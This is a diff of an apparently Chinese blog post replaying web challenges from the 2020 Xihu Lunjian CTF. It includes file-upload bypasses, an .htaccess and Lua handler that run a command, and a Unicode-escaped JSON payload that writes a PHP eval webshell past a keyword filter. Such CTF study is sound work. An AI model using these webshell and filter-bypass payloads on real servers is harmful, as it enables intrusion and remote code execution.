@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="">
+  <title>2020西湖论剑-web复现 | Ma4out7'Blog</title>
+  <meta name="author" content="Ma4out7" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="CTF比赛" />
+  
+  <meta name="description" content="2020 西湖论剑前言记得当时第一次参加比赛，虐的好惨，题目很好，网速很快，就是做不出，全程凑数，新手村的我刚出门就直接面对百级 boss，没有任何游戏体验。重新开始，今年继续 1.NewUload  文件上传，过滤了文件后缀名和文件内容都过滤了 php 关键字，甚至短标签的尖括号都不行，但是，没想到居然可以通过换行来绕过后缀名检测和用图片马来绕过文件内容的检测。  就能从 phpinfo 中发现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020西湖论剑-web复现">
+<meta property="og:url" content="http://example.com/2021/04/02/CTF%E6%AF%94%E8%B5%9B/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/index.html">
+<meta property="og:site_name" content="Ma4out7&#39;Blog">
+<meta property="og:description" content="2020 西湖论剑前言记得当时第一次参加比赛，虐的好惨，题目很好，网速很快，就是做不出，全程凑数，新手村的我刚出门就直接面对百级 boss，没有任何游戏体验。重新开始，今年继续 1.NewUload  文件上传，过滤了文件后缀名和文件内容都过滤了 php 关键字，甚至短标签的尖括号都不行，但是，没想到居然可以通过换行来绕过后缀名检测和用图片马来绕过文件内容的检测。  就能从 phpinfo 中发现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/null">
+<meta property="article:published_time" content="2021-04-02T08:06:06.000Z">
+<meta property="article:modified_time" content="2021-05-19T12:51:06.003Z">
+<meta property="article:author" content="Ma4out7">
+<meta property="article:tag" content="CTF比赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/null">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://candinya.com">作者博客</a></li>
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://github.com/Candinya/Kratos-Rebirth">项目链接</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Ma4out7&#39;Blog</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Ma4out7&#39;Blog</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        <section class="col-md-8">
+    <article>
+        <div class="kratos-hentry kratos-post-inner clearfix">
+            <header class="kratos-entry-header">
+                
+                    <h1 class="kratos-entry-title text-center">2020西湖论剑-web复现</h1>
+                
+                
+                <ul class="kratos-post-meta text-center">
+                    <li><i class="fa fa-calendar"></i> 2021-04-02</li>
+                    <li><i class="fa fa-user"></i> 作者 Ma4out7</li>
+                    <li>
+                        <i class="fa fa-edit"></i> 
+                        
+                        
+                            ~5.04K
+                        
+                        字
+                    </li>
+                    
+                </ul>
+            </header>
+            <div class="kratos-post-content">
+                <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                    本文最后编辑于 <time datetime="1621428666003"></time> 前，其中的内容可能需要更新。
+                </div>
+                
+                <hr />
+                <h2 id="2020-西湖论剑"><a href="#2020-西湖论剑" class="headerlink" title="2020 西湖论剑"></a>2020 西湖论剑</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记得当时第一次参加比赛，虐的好惨，题目很好，网速很快，就是做不出，全程凑数，新手村的我刚出门就直接面对百级 boss，没有任何游戏体验。重新开始，今年继续</p>
+<h3 id="1-NewUload"><a href="#1-NewUload" class="headerlink" title="1.NewUload"></a>1.NewUload</h3><p><img src="https://img-log.csdnimg.cn/img_convert/69458210dda3f04cb0bab6cc314be43a.png"></p>
+<ul>
+<li><p>文件上传，过滤了文件后缀名和文件内容都过滤了 php 关键字，甚至短标签的尖括号都不行，但是，没想到居然可以通过换行来绕过后缀名检测和用图片马来绕过文件内容的检测。<br><img src="https://img-blog.csdnimg.cn/20201013194700704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RNXzEwMjQ=,size_16,color_FFFFFF,t_70#pic_center"></p>
+</li>
+<li><p>就能从 phpinfo 中发现 disable_functions 中禁用了很多函数。网上有两种方法</p>
+</li>
+<li><p>第一种就是利用.htaccess+lua。lua 是也是一种轻量化脚本语言，在 PHP 环境中可以被解析</p>
+<ul>
+<li>先上传一个.htaccess 文件，作用是使 lua 文件解析生效。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.htacces</span><br><span class="line">AddHandler lua-script .lua</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后上传一个 1.lua 文件，再访问 1.lua 就能成功得到 flag。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">--[<span class="number">1.</span>lua --]</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;string&quot;</span></span><br><span class="line"></span><br><span class="line">--[[</span><br><span class="line">    This is the <span class="keyword">default</span> method name <span class="keyword">for</span> Lua handlers, see the optional</span><br><span class="line">    <span class="function"><span class="keyword">function</span>-<span class="title">name</span> <span class="title">in</span> <span class="title">the</span> <span class="title">LuaMapHandler</span> <span class="title">directive</span> <span class="title">to</span> <span class="title">choose</span> <span class="title">a</span> <span class="title">different</span></span></span><br><span class="line"><span class="function">    <span class="title">entry</span> <span class="title">point</span>.</span></span><br><span class="line"><span class="function">--]]</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">handle</span>(<span class="params">r</span>)</span></span><br><span class="line"><span class="function">    <span class="title">r</span>.<span class="title">content_type</span> = &quot;<span class="title">text</span>/<span class="title">plain</span>&quot;</span></span><br><span class="line"><span class="function">    <span class="title">r</span>:<span class="title">puts</span>(<span class="params"><span class="string">&quot;Hello Lua World!\n&quot;</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">local</span> <span class="title">t</span> = <span class="title">io</span>.<span class="title">popen</span>(<span class="params"><span class="string">&#x27;/readflag&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">local</span> <span class="title">a</span> = <span class="title">t</span>:<span class="title">read</span>(<span class="params"><span class="string">&quot;*all&quot;</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">r</span>:<span class="title">puts</span>(<span class="params">a</span>)</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">r</span>.<span class="title">method</span> == &#x27;<span class="title">GET</span>&#x27; <span class="title">then</span></span></span><br><span class="line"><span class="function">        <span class="title">for</span> <span class="title">k</span>, <span class="title">v</span> <span class="title">in</span> <span class="title">pairs</span>(<span class="params"> r:parseargs(<span class="params"></span>) </span>) <span class="title">do</span></span></span><br><span class="line"><span class="function">            <span class="title">r</span>:<span class="title">puts</span>(<span class="params"> <span class="keyword">string</span>.format(<span class="params"><span class="string">&quot;%s: %s\n&quot;</span>, k, v</span>) </span>)</span></span><br><span class="line"><span class="function">        <span class="title">end</span></span></span><br><span class="line"><span class="function">    <span class="title">else</span></span></span><br><span class="line"><span class="function">        <span class="title">r</span>:<span class="title">puts</span>(<span class="params"><span class="string">&quot;Unsupported HTTP method &quot;</span> .. r.method</span>)</span></span><br><span class="line"><span class="function">    <span class="title">end</span></span></span><br><span class="line"><span class="function"><span class="title">end</span></span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>第二种方法是弹 shell，但是方法很复杂，有点难懂，参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650485991&idx=4&sn=3c29dd773b2b91b9a1668c2d393fc1d3&chksm=83ba5103b4cdd815d343344143771da432a5957d8527b773c499ec0eea480973b3e6d2606838&scene=21#wechat_redirect">大佬文章</a></p>
+<blockquote>
+<p>参考<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/tm_1024/article/details/109056127">https://blog.csdn.net/tm_1024/article/details/109056127</a></p>
+</blockquote>
+</li>
+</ul>
+<h3 id="2-EasyJson"><a href="#2-EasyJson" class="headerlink" title="2.EasyJson"></a>2.EasyJson</h3><ul>
+<li>这题总的来说就是代码审计+（伪）文件上传+RCE,</li>
+<li>主要考点就是绕过 json 格式</li>
+<li>源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;security.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$sandbox = <span class="string">&#x27;sandbox/&#x27;</span>.sha1($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;<span class="comment">//设置沙盒根据自己ip获得目录</span></span><br><span class="line">var_dump($sandbox);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($sandbox))&#123;<span class="comment">//如果不存在就创建</span></span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    file_put_contents($sandbox.<span class="string">&quot;index.php&quot;</span>,<span class="string">&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">$content = file_get_contents(<span class="string">&quot;php://input&quot;</span>);<span class="comment">//获得post数据流</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($action == <span class="string">&quot;write&quot;</span> &amp;&amp;  SecurityCheck(<span class="string">&#x27;filename&#x27;</span>,$_GET[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp;SecurityCheck(<span class="string">&#x27;content&#x27;</span>,$content))&#123;<span class="comment">//验证函数</span></span><br><span class="line">    $content = json_decode($content);<span class="comment">//json格式解密</span></span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    $filecontent = $content-&gt;content;<span class="comment">//获得content变量的值</span></span><br><span class="line">    $filename = $sandbox.$filename;</span><br><span class="line">    file_put_contents($filename,$filecontent.<span class="string">&quot;\n Powered By Dbapp OSS.&quot;</span>);<span class="comment">//写入文件，利用点</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>($action == <span class="string">&quot;reset&quot;</span>)&#123;<span class="comment">//删除操作</span></span><br><span class="line">    $files = scandir($sandbox);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir($file))&#123;</span><br><span class="line">            <span class="keyword">if</span>($file !== <span class="string">&quot;index.php&quot;</span>)&#123;</span><br><span class="line">                unlink($sandbox.$file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Security Check Failed.&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>get 要传入 action,filename 和 source 这三个参数。source 是保证下面的 php 命令可以执行，action 是我们要执行的操作，肯定是 write 了。filename 是我们要写的文件的名字。<br>post 要传入 json 格式的参数，它的 content 键的值是我们要写入文件的内容。<br>审清楚这些，应该做的就是写一个可以 RCE 的文件，因为我们写的文件的目录已知，文件名已知，然后再读取那个文件，用蚁剑连或者进行 RCE。</p>
+<p>第一个绕过点是文件名。因为习惯性给文件命名 1.php，在这里直接没通过那个安全检测了。我一开始以为是后缀 php 被过滤，后来我把后缀去掉发现还是被阻了，然后我把文件改成了 feng.php 就好了，才发现只有字母给文件命名才行。<br>接下来就是 post 传入的参数了。post 传入后赋给变量$content，但是$content 要被 json_decode 一次。我一开始尝试这样写<code>&#123;&quot;content&quot;:&quot;&lt;?php eval($_GET[&#39;a&#39;]);?&gt;&quot;&#125;</code>,发现爆 check fail。我尝试了大小写双写绕过后还是不行，然后就卡住了。。因为真的对 json 这个内容不太了解。</p>
+<p>看了 WP，原来 content 里的 on 也被过滤了。这是我没想到的。怎么绕过呢？尝试用 unicode 编码来绕过。原理可以参考下面文章：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/306">浅谈 json 参数解析对 waf 绕过的影响</a></p>
+<ul>
+<li>被过滤的全部使用 Unicode 编码之后即可，<code>&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;&lt;?\u0070\u0068\u0070 eval($_GET[&#39;a&#39;]);?&gt;&quot;&#125;</code><br>再访问一下<a target="_blank" rel="noopener" href="http://easyjson.xhlj.wetolink.com/sandbox/9beb98a8de69744aec8456acc562a3685f92fabd/feng.php">http://easyjson.xhlj.wetolink.com/sandbox/9beb98a8de69744aec8456acc562a3685f92fabd/feng.php</a><br>然后进行 RCE。通过查看 phpinfo，可以发现这题没有任何函数被禁用，因此获取 flag 就十分容易了。<br>找到 security.php 的源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: meizj</span></span><br><span class="line"><span class="comment"> * Date: 2020/2/7</span></span><br><span class="line"><span class="comment"> * Time: 1:31 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SecurityCheck</span>(<span class="params">$type,$content</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> ($type)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;filename&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $content) !== <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;content&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>) || stristr($content,<span class="string">&#x27;php&#x27;</span>)  || stristr($content,<span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>文件名只能 a-z 的字母，对于 post 的参数，则过滤了 on,html,type,flag,upload,file,php 和.</p>
+<blockquote>
+<p>参考<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/109107736">https://blog.csdn.net/rfrder/article/details/109107736</a>?<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108967312">https://blog.csdn.net/qq_46091464/article/details/108967312</a>?</p>
+</blockquote>
+<h3 id="3-HardXss"><a href="#3-HardXss" class="headerlink" title="3.HardXss"></a>3.HardXss</h3><p>这题考的是 ServiceWorker，</p>
+<blockquote>
+<p>简单的讲，是浏览器在后台独立于网页运行的脚本。可以简单的认为是一个介于客户端和服务端之间的代理服务器，最重要的作用之一就是缓存离线资源。</p>
+</blockquote>
+<blockquote>
+<p>SW 提供了一组 API，能够拦截当前站点产生 HTTP 请求，还能控制返回结果。因此，SW 拦住请求后，使用 Cache Storage 里的内容进行返回，就可以实现离线缓存的功能。当 Cache Storage 不存在请求的资源时再向服务器请求,cache.put 可以选择性地将请求资源加载到 cache storage 中。如果不手动取消已经注册过的 sw 服务,刷新/重新打开页面都会启动站点的 sw 服务，这为我们持久化 XSS 提供了一定的条件。</p>
+</blockquote>
+<ul>
+<li>已经找不到 writeup 了….那就这样吧。😅🤓</li>
+</ul>
+
+            </div>
+            
+                <div class="kratos-copyright text-center clearfix">
+                    <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+                </div>
+            
+            <footer class="kratos-entry-footer clearfix">
+                
+                    <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                    
+                    
+                        <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                        <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/2021/04/02/CTF%E6%AF%94%E8%B5%9B/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/2021/04/02/CTF%E6%AF%94%E8%B5%9B/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/";
+            const title         = "「2020西湖论剑-web复现」";
+            const excerpt       = `2020 西湖论剑前言记得当时第一次参加比赛，虐的好惨，题目很好，网速很快，就是做不出，全程凑数，新手村的我刚出门就直接面对百级 boss，没有任何游戏体验。重新开始，今年继续
+1.NewUload
+
+文件上传，过滤了文件后缀名和文件...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                    
+                    </div>
+                
+                <div class="footer-tag clearfix">
+                    <div class="pull-left">
+                    <i class="fa fa-tags"></i>
+                        <a class="tag-none-link" href="/tags/CTF%E6%AF%94%E8%B5%9B/" rel="tag">CTF比赛</a>
+                    </div>
+                    <div class="pull-date">
+                    <span>最后编辑：2021-05-19</span>
+                    </div>
+                </div>
+            </footer>
+        </div>
+        
+            <nav class="navigation post-navigation clearfix" role="navigation">
+                
+                <div class="nav-previous clearfix">
+                    <a title=" upload-labs靶机练习" href="/2021/03/28/upload-labs/upload-labs/">&lt; 上一篇</a>
+                </div>
+                
+                
+                <div class="nav-next clearfix">
+                    <a title=" DASctf-web 复现" href="/2021/04/06/CTF比赛/DASctf/DASctf/">下一篇 &gt;</a>
+                </div>
+                
+            </nav>
+        
+        
+    </article>
+</section>
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.webp" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF%E6%AF%94%E8%B5%9B/">CTF比赛</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B0%8F%E9%97%AE%E9%A2%98/">小问题</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%9F%A5%E8%AF%86%E6%99%AE%E5%8F%8A/">知识普及</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a><span class="category-list-count">3</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/CTF%E6%AF%94%E8%B5%9B/" style="font-size: 0.8em;">CTF比赛</a> <a href="/tags/sql/" style="font-size: 0.6em;">sql</a> <a href="/tags/upload/" style="font-size: 0.6em;">upload</a> <a href="/tags/xss/" style="font-size: 0.6em;">xss</a> <a href="/tags/%E5%B0%8F%E9%97%AE%E9%A2%98/" style="font-size: 0.6em;">小问题</a> <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 0.7em;">工具使用</a> <a href="/tags/%E7%9F%A5%E8%AF%86%E6%99%AE%E5%8F%8A/" style="font-size: 0.6em;">知识普及</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2021/04/06/CTF%E6%AF%94%E8%B5%9B/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF/"><i class="fa  fa-book"></i> 红明谷-web 复现</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/04/06/CTF%E6%AF%94%E8%B5%9B/ciscn/"><i class="fa  fa-book"></i> CSICN-web</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/DASctf/"><i class="fa  fa-book"></i> DASctf-web 复现</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/04/02/CTF%E6%AF%94%E8%B5%9B/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"><i class="fa  fa-book"></i> 2020西湖论剑-web复现</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/03/28/upload-labs/upload-labs/"><i class="fa  fa-book"></i> upload-labs靶机练习</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
